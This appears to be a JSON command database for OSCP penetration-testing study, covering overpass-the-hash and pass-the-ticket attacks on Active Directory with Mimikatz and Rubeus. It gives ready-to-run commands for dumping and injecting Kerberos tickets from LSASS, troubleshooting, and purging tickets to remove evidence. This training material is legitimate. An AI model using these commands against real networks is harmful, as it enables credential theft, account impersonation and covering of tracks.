{
  "commands": [
    {
      "id": "overpass-mimikatz-pth",
      "name": "Overpass-the-Hash - Mimikatz sekurlsa::pth",
      "description": "Convert NTLM hash to Kerberos TGT by creating process with hash then requesting Kerberos tickets",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain FQDN",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "overpass-the-hash",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "overpass-rubeus-asktgt"
      ],
      "next_steps": [
        "overpass-net-use-trigger to request TGT",
        "kerberos-klist-verify to check tickets",
        "psexec-sysinternals-interactive for lateral movement"
      ],
      "flag_explanations": {
        "sekurlsa::pth": "Pass-the-hash module",
        "/user": "Username",
        "/domain": "Domain FQDN (corp.com not corp)",
        "/ntlm": "NTLM hash",
        "/run": "Program to launch (PowerShell recommended)"
      },
      "success_indicators": [
        "user : <USER>",
        "domain : <DOMAIN>",
        "New PowerShell window opens"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_pth",
        "privilege::debug FAILED"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "No tickets generated": "Must trigger Kerberos auth - use 'net use' or access network resource",
        "whoami shows wrong user": "Expected - token shows original user, but Kerberos tickets use <USER>"
      },
      "notes": "EDUCATIONAL CONTEXT: Overpass-the-hash upgrades NTLM hash to Kerberos TGT for tools requiring Kerberos auth. WHY THIS WORKS: Mimikatz injects hash into LSASS, new process can request TGT from KDC using hash for pre-authentication. DIFFERENCE FROM PTH: PTH uses NTLM protocol, Overpass uses Kerberos protocol (more compatible, less logging). WHOAMI CONFUSION: whoami shows original user (checks token), but 'klist' shows Kerberos tickets for <USER>. MANUAL TRIGGER: After sekurlsa::pth, must trigger Kerberos auth (net use \\\\DC\\C$) to generate TGT. TIME ESTIMATE: 2-3 minutes. EXAM TIP: Use when target requires Kerberos (Microsoft PsExec) but you only have NTLM hash.",
      "oscp_relevance": "high"
    },
    {
      "id": "overpass-net-use-trigger",
      "name": "Overpass-the-Hash - Trigger Kerberos TGT Request",
      "description": "Trigger Kerberos TGT/TGS generation after overpass-the-hash by accessing network resource",
      "command": "net use \\\\<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname (NOT IP - must use hostname for Kerberos)",
          "example": "files04",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "overpass-the-hash",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [
        "overpass-mimikatz-pth"
      ],
      "alternatives": [],
      "next_steps": [
        "kerberos-klist-verify to see TGT and TGS",
        "psexec-sysinternals-interactive now works with Kerberos"
      ],
      "flag_explanations": {
        "net use": "Map network drive (triggers Kerberos authentication)",
        "\\\\<TARGET>": "UNC path - MUST use hostname not IP for Kerberos SPN lookup"
      },
      "success_indicators": [
        "The command completed successfully",
        "klist shows TGT (krbtgt) and TGS (cifs/target)"
      ],
      "failure_indicators": [
        "System error 5 - Access is denied",
        "The network path was not found"
      ],
      "troubleshooting": {
        "Access denied": "Hash may be invalid or user lacks permissions",
        "Network path not found": "Use hostname not IP - Kerberos requires SPN resolution",
        "Still no tickets": "Verify PowerShell session spawned by mimikatz sekurlsa::pth",
        "IP address used": "Change to hostname: net use \\\\FILES04 not \\\\192.168.50.73"
      },
      "notes": "EDUCATIONAL CONTEXT: Overpass-the-hash requires triggering Kerberos authentication to generate tickets. WHY NECESSARY: sekurlsa::pth only injects credentials - must use them to request TGT from KDC. HOSTNAME REQUIREMENT: Kerberos uses SPNs (Service Principal Names) which require hostnames not IPs. WHAT GETS CREATED: TGT (Ticket Granting Ticket from krbtgt) and TGS (Ticket Granting Service for CIFS). ALTERNATIVE TRIGGERS: Any network access works - dir, Get-Content, Test-Path to UNC path. TIME ESTIMATE: <10 seconds. EXAM TIP: Always verify with klist after triggering - no tickets means something wrong with setup.",
      "oscp_relevance": "high"
    },
    {
      "id": "kerberos-klist-verify",
      "name": "Kerberos - List Cached Tickets (klist)",
      "description": "Display cached Kerberos TGT and TGS tickets for current session",
      "command": "klist",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "oscp",
        "kerberos",
        "verification",
        "enumeration",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "Identify TGT (Server: krbtgt)",
        "Identify TGS (Server: service/hostname)",
        "Export tickets with passticket-mimikatz-export if needed"
      ],
      "flag_explanations": {
        "klist": "List Kerberos tickets (built-in Windows command)",
        "klist purge": "Clear all cached tickets",
        "klist tgt": "Show only TGT tickets"
      },
      "success_indicators": [
        "Client: <USER> @ <DOMAIN>",
        "Server: krbtgt/<DOMAIN> (TGT)",
        "Server: cifs/<TARGET> (TGS for file access)",
        "Cached Tickets: (N)"
      ],
      "failure_indicators": [
        "Cached Tickets: (0)",
        "Error: No tickets found"
      ],
      "troubleshooting": {
        "No tickets found": "No Kerberos auth performed yet - trigger with net use or access network resource",
        "Wrong user in tickets": "Tickets cached in different session - ensure checking correct PowerShell window",
        "Tickets expired": "End Time shows past time - perform new authentication"
      },
      "notes": "EDUCATIONAL CONTEXT: klist is built-in Windows tool to inspect Kerberos ticket cache. TICKET TYPES: TGT (Ticket Granting Ticket) has Server=krbtgt, TGS (Service Ticket) has Server=service/hostname. WHY CHECK: Verify overpass-the-hash worked, confirm ticket exists before attempting lateral movement. TICKET LIFETIME: Default 10 hours for TGT, check End Time field. ENCRYPTION: KerbTicket Encryption Type shows encryption (AES-256, AES-128, RC4). TIME ESTIMATE: <5 seconds. EXAM TIP: After any Kerberos operation, verify with klist to confirm success before proceeding.",
      "oscp_relevance": "high"
    },
    {
      "id": "passticket-mimikatz-export",
      "name": "Pass-the-Ticket - Export Tickets (Mimikatz)",
      "description": "Export all cached Kerberos tickets to .kirbi files for reuse on other systems",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::tickets /export",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "oscp",
        "pass-the-ticket",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "List exported .kirbi files: dir *.kirbi",
        "Inject ticket with passticket-mimikatz-inject",
        "Transfer .kirbi to other systems for reuse"
      ],
      "flag_explanations": {
        "sekurlsa::tickets": "Access LSASS process to extract tickets",
        "/export": "Save tickets to .kirbi files in current directory",
        "privilege::debug": "Required for LSASS memory access"
      },
      "success_indicators": [
        "* Saved to file [0;xxxxxx]-2-0-*.kirbi",
        "Multiple .kirbi files created",
        "Tickets exported for multiple users/sessions"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_acquireLSA",
        "privilege::debug FAILED",
        "No tickets found"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "No tickets exported": "No active Kerberos sessions - wait for users to login/authenticate",
        "ERROR kuhl_m_sekurlsa_acquireLSA": "LSASS protection enabled - may need to bypass PPL",
        "Too many .kirbi files": "Normal - exports all tickets from all sessions"
      },
      "notes": "EDUCATIONAL CONTEXT: Mimikatz extracts Kerberos tickets from LSASS memory and saves to .kirbi format. WHY EXPORT: Tickets can be reused on different systems, moved laterally without credentials. FILENAME FORMAT: [LUID]-[Group]-[Type]-[Flags]-user@service.kirbi. TICKET TYPES: TGT (type 2-0) vs TGS (type 0-0). MULTIPLE SESSIONS: Exports tickets from all logged-in users and service accounts. KIRBI FORMAT: Mimikatz proprietary format - use kerberos::ptt to inject. TIME ESTIMATE: 1-2 minutes including export. EXAM TIP: Export immediately after compromising high-value system - tickets are time-limited.",
      "oscp_relevance": "high"
    },
    {
      "id": "passticket-mimikatz-inject",
      "name": "Pass-the-Ticket - Inject Ticket (Mimikatz)",
      "description": "Inject exported .kirbi Kerberos ticket into current session for impersonation",
      "command": "mimikatz # kerberos::ptt <TICKET_FILE>.kirbi",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TICKET_FILE>",
          "description": ".kirbi file to inject",
          "example": "[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-ticket",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "passticket-rubeus-ptt",
        "rubeus-ptt"
      ],
      "next_steps": [
        "kerberos-klist-verify to confirm injection",
        "Access resource: dir \\\\<TARGET>\\<SHARE>",
        "Lateral movement using injected ticket context"
      ],
      "flag_explanations": {
        "kerberos::ptt": "Pass-the-ticket module",
        "<FILE>.kirbi": "Ticket file to inject (full path or relative)"
      },
      "success_indicators": [
        "* File: '<FILE>.kirbi': OK",
        "Ticket successfully imported",
        "klist shows new ticket"
      ],
      "failure_indicators": [
        "ERROR kull_m_file_readData",
        "File not found",
        "Ticket import failed"
      ],
      "troubleshooting": {
        "File not found": "Use full path or ensure in current directory: dir *.kirbi",
        "Ticket import failed": ".kirbi file may be corrupted - re-export",
        "Access still denied after import": "Ticket may be expired - check with klist",
        "Wrong service": "Ensure ticket matches target service (cifs for file shares, http for web, etc.)"
      },
      "notes": "EDUCATIONAL CONTEXT: Pass-the-ticket injects stolen Kerberos ticket into current session. WHY THIS WORKS: Windows uses injected ticket for authentication without validating how it was obtained. TICKET SERVICES: Match ticket service to target - cifs for files, http for web, ldap for directory. NO ADMIN REQUIRED: Unlike pass-the-hash, PTT works for current user (no admin needed). TICKET LIFETIME: Check klist after injection - tickets have expiration time (End Time). SERVICE MATCHING: dave@cifs-web04.kirbi only grants access to CIFS service on web04. TIME ESTIMATE: <1 minute for injection. EXAM TIP: Prioritize TGT tickets (krbtgt) as they can request any TGS.",
      "oscp_relevance": "high"
    },
    {
      "id": "passticket-rubeus-ptt",
      "name": "Pass-the-Ticket - Rubeus PTT",
      "description": "Inject .kirbi ticket using Rubeus (alternative to Mimikatz)",
      "command": "Rubeus.exe ptt /ticket:<TICKET_FILE>.kirbi",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TICKET_FILE>",
          "description": ".kirbi ticket file",
          "example": "ticket.kirbi",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "pass-the-ticket",
        "rubeus",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "passticket-mimikatz-inject"
      ],
      "next_steps": [
        "klist to verify",
        "Access resources as ticket owner"
      ],
      "flag_explanations": {
        "ptt": "Pass-the-ticket action",
        "/ticket": "Path to .kirbi file"
      },
      "success_indicators": [
        "[*] Ticket successfully imported",
        "klist shows ticket"
      ],
      "failure_indicators": [
        "Error importing ticket",
        "File not found"
      ],
      "troubleshooting": {
        "File not found": "Use full path",
        "Import failed": "Ensure .kirbi format correct"
      },
      "notes": "EDUCATIONAL CONTEXT: Rubeus provides modern alternative to Mimikatz for pass-the-ticket. WHY RUBEUS: More actively maintained, better OPSEC features. TIME ESTIMATE: <1 minute. EXAM TIP: Rubeus and Mimikatz both work - use whichever available.",
      "oscp_relevance": "high"
    },
    {
      "id": "overpass-rubeus-asktgt",
      "name": "Overpass-the-Hash - Rubeus asktgt",
      "description": "Request TGT using NTLM hash with Rubeus (alternative to Mimikatz sekurlsa::pth)",
      "command": "Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM (RC4) hash",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "overpass-the-hash",
        "rubeus",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "overpass-mimikatz-pth"
      ],
      "next_steps": [
        "klist to verify TGT",
        "Use Kerberos authentication"
      ],
      "flag_explanations": {
        "asktgt": "Request TGT from KDC",
        "/user": "Username",
        "/domain": "Domain FQDN",
        "/rc4": "NTLM hash (RC4 encryption)",
        "/ptt": "Pass-the-ticket - auto inject TGT",
        "/aes256": "Use AES256 hash instead (if available)"
      },
      "success_indicators": [
        "[*] Got TGT",
        "[*] Ticket successfully imported",
        "klist shows TGT"
      ],
      "failure_indicators": [
        "KDC_ERR_PREAUTH_FAILED",
        "KDC_ERR_CLIENT_NOT_FOUND"
      ],
      "troubleshooting": {
        "PREAUTH_FAILED": "Invalid hash",
        "CLIENT_NOT_FOUND": "Username/domain incorrect"
      },
      "notes": "EDUCATIONAL CONTEXT: Rubeus directly requests TGT using hash (cleaner than Mimikatz method). WHY USE THIS: Single command vs Mimikatz multi-step. TIME ESTIMATE: <1 minute. EXAM TIP: Rubeus asktgt more reliable than Mimikatz sekurlsa::pth.",
      "oscp_relevance": "high"
    },
    {
      "id": "kerberos-purge-tickets",
      "name": "Kerberos - Purge All Tickets",
      "description": "Clear all cached Kerberos tickets from current session",
      "command": "klist purge",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "oscp",
        "kerberos",
        "cleanup",
        "opsec",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "Clean state for testing new tickets",
        "Remove stolen tickets before disconnecting"
      ],
      "flag_explanations": {
        "purge": "Delete all Kerberos tickets from cache"
      },
      "success_indicators": [
        "Ticket cache purged successfully",
        "klist shows 0 tickets"
      ],
      "failure_indicators": [
        "Access denied"
      ],
      "troubleshooting": {
        "Access denied": "Run as administrator or purge only affects current user tickets"
      },
      "notes": "EDUCATIONAL CONTEXT: Clean up ticket cache for OPSEC or testing. WHY USE: Remove evidence of ticket injection, prepare clean state. TIME ESTIMATE: <5 seconds. EXAM TIP: Use between testing different stolen tickets.",
      "oscp_relevance": "medium"
    },
    {
      "id": "kerberos-troubleshoot-time",
      "name": "Kerberos - Troubleshoot Time Skew",
      "description": "Check time synchronization between client and DC (Kerberos requires <5 min skew)",
      "command": "net time \\\\<DC>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DC>",
          "description": "Domain controller hostname",
          "example": "DC1",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "kerberos",
        "troubleshooting",
        "time-sync",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "If >5 min difference, sync time: net time \\\\<DC> /set /yes",
        "Retry Kerberos authentication after sync"
      ],
      "flag_explanations": {
        "net time": "Display or synchronize time",
        "\\\\<DC>": "Query time from DC",
        "/set /yes": "Synchronize local time to DC"
      },
      "success_indicators": [
        "Current time at \\\\<DC> is <TIME>",
        "Time difference <5 minutes"
      ],
      "failure_indicators": [
        "System error 5 - Access denied",
        "Time difference >5 minutes"
      ],
      "troubleshooting": {
        "Access denied": "Use /set /yes to force: net time \\\\<DC> /set /yes",
        ">5 min skew": "Kerberos will fail - synchronize time before retry",
        "Cannot contact DC": "Check network connectivity and firewall"
      },
      "notes": "EDUCATIONAL CONTEXT: Kerberos requires client and DC time within 5 minutes (default). WHY IMPORTANT: Time skew causes KDC_ERR_SKEW error, all Kerberos auth fails. COMMON ISSUE: VMs with suspended state, isolated networks without NTP. FIX: net time \\\\<DC> /set /yes synchronizes to DC time. TIME ESTIMATE: <10 seconds check, <30 seconds fix. EXAM TIP: If Kerberos mysteriously fails, check time first - common troubleshooting step.",
      "oscp_relevance": "medium"
    }
  ]
}